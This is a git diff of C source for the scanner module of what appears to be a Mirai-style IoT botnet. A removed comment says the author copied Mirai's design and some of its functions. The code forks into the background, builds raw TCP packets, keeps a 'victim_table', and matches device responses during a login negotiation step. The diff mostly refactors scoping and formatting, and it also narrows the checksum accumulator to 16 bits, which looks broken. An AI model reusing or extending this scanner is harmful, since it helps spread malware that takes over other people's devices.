@@ -1,26 +1,15 @@
 #include "../include/main.h"
-/*
-	Okay so the original idea was to have a listening proc a sending proc and
-	a recv proc. Then when it recv a client it would spawn a proc to deal with
-	that client.
 
-	Then I realized how weak the devices I'm aiming for are and just used a
-	structure similar to mirai. Edit: so after writing most of this scanner I read mirais
-	and it looks like we had the same idea... I've also decided to steal some of it's functions because it's easier
+static port_t LOCAL_PORT; // Global source port
+static ipv4_t LOCAL_ADDR; // Global source port
+static struct scan_victim *victim_table;
 
-	Full disclosure: I'm not a coding and network god so mirais scanner is
-	probably better (100% sure it is). I'm just doing this for fun :)
-*/
-port_t LOCAL_PORT; // Global source port
-ipv4_t LOCAL_ADDR; // Global source port
-struct scan_victim *victim_table;
-
-bool scan_able = true;
-bool scan_scanning = false;
+static bool scan_able = true;
+static bool scan_scanning = false;
 
 void scan_init(void)
 {
-#	ifndef SCANNER_FORCE
+#ifndef SCANNER_TEST
 	int32_t ret;
 
 	if ((ret = fork()) != 0)
@@ -32,16 +21,15 @@ void scan_init(void)
 			scan_able = false;
 		_exit(0);
 	}
-#	endif
+#endif
 	return;
 }
 
-// Checksum calculators
-// Only for use in this file
-// Not mine!
-uint16_t checksum_generic(uint16_t *addr, uint32_t count)
+// I didn't write the checksum funcs
+static uint16_t checksum_generic(uint16_t *addr, uint32_t count)
 {
-	register unsigned long sum = 0;
+	// unsigned long sum = 0;
+	uint16_t sum = 0;
 
 	for (sum = 0; count > 1; count -= 2)
 		sum += *addr++;
@@ -53,9 +41,9 @@ uint16_t checksum_generic(uint16_t *addr, uint32_t count)
 	
 	return ~sum;
 }
-uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
+static uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
 {
-	const uint16_t *buf = buff;
+	uint16_t *buf = buff;
 	uint32_t ip_src = iph->saddr;
 	uint32_t ip_dst = iph->daddr;
 	uint32_t sum = 0;
@@ -68,7 +56,7 @@ uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int l
 	}
 
 	if (len == 1)
-		sum += *((uint8_t *) buf);
+		sum += *((uint8_t *)buf);
 
 	sum += (ip_src >> 16) & 0xFFFF;
 	sum += ip_src & 0xFFFF;
@@ -135,8 +123,7 @@ static inline __attribute__((always_inline)) void scan_negotiate(int32_t sock)
 	return;
 }
 
-/*static inline __attribute__((always_inline))*/
-void xselect(int32_t fd)
+static void xselect(int32_t fd)
 {
 	fd_set fdset;
 	struct timeval timeout;
@@ -150,7 +137,7 @@ void xselect(int32_t fd)
 	select(fd + 1, &fdset, NULL, NULL, &timeout);
 }
 
-static inline __attribute__((always_inline)) bool structcmp(unsigned char *buf, const char **str)
+bool structcmp(unsigned char *buf, const char **str)
 {
 	while (*str != NULL)
 	{
@@ -161,7 +148,7 @@ static inline __attribute__((always_inline)) bool structcmp(unsigned char *buf, 
 	return false;
 }
 
-uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2)
+static uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2)
 {
 	/*
 	// This code right here works
@@ -258,7 +245,7 @@ uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2
 	return found;
 }
 
-bool scan_setnonblock(int32_t fd)
+static bool scan_setnonblock(int32_t fd)
 {
 	if (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)) == -1)
 	{
@@ -270,14 +257,14 @@ bool scan_setnonblock(int32_t fd)
 
 bool scan_scanner(void)
 {
-#	ifdef DEBUG
+#ifdef DEBUG
 	int32_t max = getdtablesize();
 	printd("Maximum files open: %d", max);
-#	endif
-#	ifndef SCANNER_TEST
+#endif // DEBUG
+#ifndef SCANNER_TEST
 	if (scan_able == false || scan_scanning == true)
 		_exit(0);
-#	endif
+#endif // SCANNER_TEST
 	scan_scanning = true;
 	printd("Initializing Scanner");
 
@@ -291,7 +278,9 @@ bool scan_scanner(void)
 		victim_table[i].tries = 0;
 	}
 
-	int32_t sock, i = 1, n;
+	int32_t sock, i = 1;
+	int64_t n;
+
 	char datagram[200];
 	zero(datagram, 200);
 
@@ -310,11 +299,9 @@ bool scan_scanner(void)
 #	endif
 	printd("Local info: %d %s", LOCAL_ADDR, ipv4_unpack(LOCAL_ADDR));
 
-	// Set the random source port
-	do
-		LOCAL_PORT = rand();
-	while (LOCAL_PORT < 1024); // make sure it isn't send below 1024 which is
-	// reserved for root use only
+	do // Set the random source port
+		LOCAL_PORT = (port_t)rand();
+	while (LOCAL_PORT < 1024); // make sure it isn't send below 1024 which is reserved for root use only
 
 
 	// Sockaddr header fillout
